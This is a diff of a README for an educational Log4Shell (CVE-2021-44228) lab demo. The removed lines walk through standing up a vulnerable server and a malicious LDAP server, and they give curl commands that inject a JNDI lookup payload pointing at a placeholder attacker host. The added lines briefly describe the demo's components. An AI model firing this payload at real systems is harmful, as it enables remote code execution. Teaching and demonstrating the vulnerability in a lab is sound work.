@@ -1,67 +1,8 @@
-# Log4Shell in action
+# Simple Log4Shell demonstration
 
-This project aims to demonstrate how the Log4Shell / CVE-2021-44228 vulnerability works.
+## Adapted from https://github.com/mschmnet/Log4Shell-demo
 
-## Requirements
-
-You only need to have Docker installed. Ideally you have two different virtual machines. One for the _vulnerable server_ and one for the _malicious server_ that will host the malicious codebase and a LDAP server.
-
-Optionally you have _Make_ and _Docker Compose_ installed but this is **not** necesarry since this repo also contains a `make.sh` to skip these requirements and use them from within a docker container.
-
-## Install Docker (optionally)
-
-If you haven't already, here are the steps to install Docker on a Debian VM. You can use these steps: https://gist.github.com/mschmnet/5d8c979920801c73e148c901a5989b46
-
-## Download the repository
-
-```
-git clone git@github.com:mschmnet/Log4Shell-demo.git 
-```
-
-## Install vulnerable server
-
-```
-cd vulnerable-server
-../make.sh run # Or you coud execute make run if you hade Make and Docker Compose installed
-```
-
-## Start malicious server
-
-This will start a basic LDAP server and basic Python server to serve the malicious Java classes.
-
-You need to provide the IP address or domain name where these servers will be available
-
-```
-cd malicious-server
-../make.sh run CODEBASE_URL=SERVER_IP_OR_DOMAIN_NAME # Optionally make instead of ../make.sh if you had Make and Docker Compose installed
-``` 
-
-## How to attack the target server
-
-```
-curl -X GET -G --data-urlencode 'foo=${jndi:ldap://IP_OR_DOMAIN_MALICIOUS_SERVER:1389/a}' http://IP_OR_DOMAIN_VULNERABLE_SERVER/some-endpoint
-
-```
-or just 
-```
-curl --location --request GET 'http://IP_OR_DOMAIN_VULNERABLE_SERVER/some-endpoint?foo=%24%7Bjndi%3Aldap%3A%2F%2FIP_OR_DOMAIN_MALICIOUS_SERVER%3A1389%2Fa%7D'
-```
-
-where `${jndi:ldap://IP_OR_DOMAIN_MALICIOUS_SERVER:1389/a}` is just URL encoded
-
-
-## How to stop any of them
-
-```
-../make.sh stop
-```
-
-## How to show the logs 
-
-```
-../make.sh logs 
-```
-
-## Slides
-
-https://raw.githubusercontent.com/mschmnet/Log4Shell-demo/main/pdf/slides.pdf
+This repository contains a simple Log4Shell demonstration based on:
+- OpenJDK 8u191 (before patch for CVE-2018-3149, in order to demonstrate without deserialization vulnerabilities and Gadget chaining)
+- Spring Boot Starter Web with Spring Boot Starter Log4j2 (fixed version from December 2021, using log4j-core 2.14.1)
+- LDAP JNDI Reference Server from https://github.com/mbechler/marshalsec
